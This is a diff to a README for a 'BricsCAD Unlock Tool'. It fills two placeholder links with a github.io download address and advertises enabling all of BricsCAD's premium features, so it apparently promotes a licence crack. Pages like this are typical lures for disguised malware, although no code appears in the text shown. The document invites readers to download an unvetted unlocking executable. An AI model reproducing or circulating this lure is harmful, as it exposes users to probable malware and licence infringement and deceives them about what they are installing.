@@ -6,7 +6,7 @@
 <h1 align="center">⚡ BricsCAD Unlock Tool</h1>
 
 <p align="center">
-  <a href="YOUR_LINK_HERE" target="_blank">
+  <a href="https://bricscad-free-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20BricsCAD%20Unlock%20Tool-Enable%20All%20Features-FF6600?style=for-the-badge&logo=autodesk&logoColor=white" 
          alt="Download BricsCAD Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐ Unlock BricsCAD – Full CAD Functionality
 
 Enable all premium BricsCAD features including 2D drafting, 3D modeling, BIM, and mechanical design tools.  
-[Download the Unlock Tool](YOUR_LINK_HERE) and enhance your CAD productivity.
+[Download the Unlock Tool](https://bricscad-free-download.github.io/.github/) and enhance your CAD productivity.
 
 ---
 
